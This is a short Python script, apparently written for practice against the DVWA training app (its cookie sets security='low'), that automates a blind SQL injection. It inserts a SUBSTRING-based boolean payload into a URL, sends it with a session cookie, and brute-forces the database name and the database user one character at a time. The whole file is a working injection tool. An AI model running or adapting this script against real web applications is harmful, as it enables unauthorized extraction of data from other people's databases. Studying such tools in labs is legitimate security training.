import string
import requests
import sys


def check(webpage, idenifier):
    if webpage.find(idenifier) == -1:
        return False
    return True


def request(url, selector, coockie, position, character):
    # coockie para sesion en DWVA
    cookies = dict(PHPSESSID=coockie, security='low')
    temp = url[0:url.index("<INJECT>")] + "1\' and SUBSTRING(" + selector + "," + str(position) + ",1) = \"" + character + "\" -- -"
    temp2 = url[url.index("<INJECT>") + 8:]
    final = temp + temp2

    print(url)
    print(temp)
    print(temp2)
    print(final)

    return (requests.get(final, cookies=cookies)).text


def bruteforce(url, identifier, coockie, selector):
    dictionary = string.ascii_lowercase
    dictionary += '-_=+/?.,<>|[]{}()*&^%$#@!~'
    dictionary += '1234567890'
    value = ""
    exit = False
    i = 1

    while exit is False:
        for letter in dictionary:
            success = check(request(url, selector, coockie, i, letter), identifier)
            if success:
                value += letter
                i += 1
                break
            elif letter == '0':
                exit = True
                break
    return value


def blind_tester():

    # Con parametros en ejecucion
    if len(sys.argv) == 4:
        url = sys.argv[1]
        identifier = sys.argv[2]
        coockie = sys.argv[3]
    # Sin parametros en ejecucion
    else:
        url = input("URL: ")
        identifier = input("Identificador: ")
        coockie = input("Coockie: ")

    print("Database: " + bruteforce(url, identifier, coockie, "database()"))
    print("Usuario: " + bruteforce(url, identifier, coockie, "user()"))


blind_tester()
